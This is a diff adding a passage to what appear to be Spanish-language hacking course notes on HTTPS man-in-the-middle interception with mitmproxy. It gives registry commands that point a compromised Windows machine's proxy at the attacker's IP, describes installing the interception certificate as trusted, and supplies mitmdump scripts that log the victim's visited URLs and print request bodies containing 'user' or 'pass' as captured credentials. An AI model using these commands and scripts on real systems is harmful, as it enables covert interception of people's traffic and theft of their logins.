@@ -3821,7 +3821,80 @@ def main():
 if __name__ == "__main__":
 	main()
 ```
-    
+Ya no hace falta el envenenamiento ARP, para el DNS o para el HTTP si podemos seguir usándolo. Pero ahora vamos a emplear un proxy y atacar con Man in the Middle. Y ya luego nosotros nos encargamos de las consultas.
+
+> ¿Qué es un proxy?: Es un equipo que hace de intermediario entre un cliente y un servidor filtrando paquetes. MITM proxy es una herramienta para levantar un server proxy.
+
+Todo esta cifrado, pero instalaremos un certificado de MITM para poder descifrar todo el trafico https://mitmproxy.org/. Y nos genera 3 binarios que vamos a utilizar. Dar por hecho que hemos vulnerado la máquina windows y como nt-authority system podríamos settear el proxy desde consola, pero el certificado es algo más complicado.
+
+Nos iremos a la página mitm.it veremos un mensaje diciendo `if you can see this, traffic is not passing through mitmproxy`.
+
+Para hacerlo hay que ejecutar ./mitmweb y lo que hace es crear como un servidor en escucha en el equipo local.
+
+Al haber vulnerado la máquina en los ajustes de windows hay que escribir configuración de proxy y nos iremos a configuración manual. Pondremos nuestra dirección ip y el puerto 8080. Y en la página ya tendremos para instalar el certificado.
+
+Desde consola se abre el regedit y aplicar el cambio de habilitar el proxy. 
+
+HKEY_CURRENT_USER
+SOFTWARE
+MICROSOFT
+WINDOWS
+CURRENT_VERSION
+INTERNET SETTINGS
+
+y el valor de proxy enable y si vale 0 esta desactivada
+Shell como administrador
+```powershell
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
+```
+
+```powershell
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "192.168.0.40:8080" /f
+```
+
+Ahora todo el equipo a nivel de comunicación de trafico pasará a nuestra máquina de atacante. Ahora falta que la máquina pueda navegar sin problema. Ejecutamos el ./mitmproxy. Hay que instalar el certificado en Entidades de certificación de confianza.
+
+Pero la gracia es hacer scripting con mitmdump
+
+```python
+#!/usr/bin/env python3
+from mitmproxy import http
+from mitmproxy import ctx
+
+def request(packet):
+	ctx.log.info(f"[+] URL: {packet.request.url}")
+
+def response(packet):
+	ctx.log.info(f"[+] RESPONSE: {packet.request.url}")
+```
+
+Ejecutar ./mitmdump -s http_sniffer.py --quiet
+
+```python
+#!/usr/bin/env python3
+from mitmproxy import http
+from urllib.parse import urlparse
+
+def has_keywords(data, keywords):
+	return any(keyword in data for keyword in keywords)
+
+def request(packet):
+	url = packet.request.url
+	parsed_url = urlparse(url)
+	scheme = parsed_url.scheme
+	domain = parsed_url.netloc
+	path = parsed_url.path
+	print(f"[+] URL visitada por la victima: {scheme}://{domain}{path}")
+
+	keywords = ["user", "pass"]
+	data = packet.request.get_text()
+	if has_keywords(data, keywords):
+		print(f"[+] Posibles credenciales capturadas: {data}")
+
+
+```
+
+
 <h3 class="titulo-principal">Scripting - HTTPS_Image Sniffer con mitmdump</h3>
 
 <h3 class="titulo-principal">Scripting - DNS Spoofer con Scapy y NetfilterQueue</h3>
